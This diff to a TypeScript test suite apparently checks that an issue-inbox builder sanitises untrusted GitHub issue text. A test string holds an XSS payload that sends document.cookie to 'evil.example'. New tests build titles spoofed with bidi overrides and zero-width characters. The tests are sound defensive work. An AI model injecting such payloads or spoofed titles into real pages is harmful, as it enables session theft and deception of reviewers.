@@ -31,7 +31,7 @@ describe('authorTrusted (#9 threat row 5; the team app by the owner decision on 
 
   it('keeps an untrusted item in the list, in its place (it is marked, not dropped)', () => {
     expect(inbox.items.map((item) => item.number)).toEqual([
-      10, 11, 20, 12, 13, 14, 21, 23, 24, 15, 17, 22, 16,
+      10, 11, 20, 12, 13, 14, 21, 23, 24, 30, 31, 32, 33, 34, 35, 15, 17, 22, 16,
     ]);
   });
 });
@@ -49,6 +49,24 @@ describe('untrusted text (#9 threat row 4)', () => {
     expect(card?.body).toBe(
       "**Your answer:** /approve <img src=x onerror=alert(document.cookie)> · /reject why\n\n<script>fetch('https://evil.example/'+document.cookie)</script>",
     );
+  });
+
+  it('strips bidi overrides and zero-width characters from a title, so it cannot pose as another (#287)', () => {
+    const [rlo, pdf, zwsp, wj] = [0x202e, 0x202c, 0x200b, 0x2060].map((point) => String.fromCodePoint(point));
+    const outsider = openIssues.find((issue) => issue.number === 14);
+    if (outsider === undefined) {
+      throw new Error('fixture #14 missing');
+    }
+    const spoofing: IssueRecord[] = [
+      { ...outsider, number: 14, title: `Approve ${rlo}nalp wen eht${pdf}` },
+      { ...outsider, number: 16, title: `Ap${zwsp}prove the${wj} new plan` },
+    ];
+    const items = buildInbox({ openIssues: spoofing, reviewerLogins: ['r'], repoFullName: 'geeera/edge-cases' }).items;
+    expect(items.map((item) => item.title)).toEqual(['Approve nalp wen eht', 'Approve the new plan']);
+    expect(buildQuestions(spoofing).items.map((item) => item.title)).toEqual([
+      'Approve nalp wen eht',
+      'Approve the new plan',
+    ]);
   });
 
   it('drops a javascript: url and a non-https one', () => {
@@ -83,5 +101,35 @@ describe('setup and paused', () => {
   it('never lists the inbox issue, the run log or a pull request', () => {
     expect(inbox.items.map((item) => item.number)).not.toEqual(expect.arrayContaining([1]));
     expect(inbox.items.some((item) => [1, 2, 3].includes(item.number))).toBe(false);
+  });
+});
+
+describe('question context (#276)', () => {
+  const body = '**Your answer:** /approve (recommended) · /reject\n\n## Кратко\nКоротко\n\n## Вопрос\nAsk <b>now</b>?';
+  const issue = (number: number, authorAssociation: string): IssueRecord => ({
+    number,
+    title: 'A long English title',
+    body,
+    htmlUrl: `https://github.com/geeera/edge-cases/issues/${String(number)}`,
+    state: 'open',
+    labels: ['kind:question'],
+    isPullRequest: false,
+    updatedAt: null,
+    authorAssociation,
+    authorLogin: 'someone',
+    authorType: 'User',
+  });
+  const items = buildQuestions([issue(1, 'OWNER'), issue(2, 'NONE')]).items;
+  const expected = { summary: 'Коротко', question: 'Ask now?', structured: true };
+
+  it('parses a trusted author’s sections into plain text on the question card and the inbox', () => {
+    expect(items[0]?.context).toMatchObject(expected);
+    const needs = buildInbox({ openIssues: [issue(1, 'OWNER')], reviewerLogins: ['r'], repoFullName: 'a/b' });
+    expect(needs.items[0]?.context).toMatchObject(expected);
+  });
+
+  it('never reads an outsider’s body into the card', () => {
+    expect(items[1]?.authorTrusted).toBe(false);
+    expect(items[1]?.context).toBeNull();
   });
 });
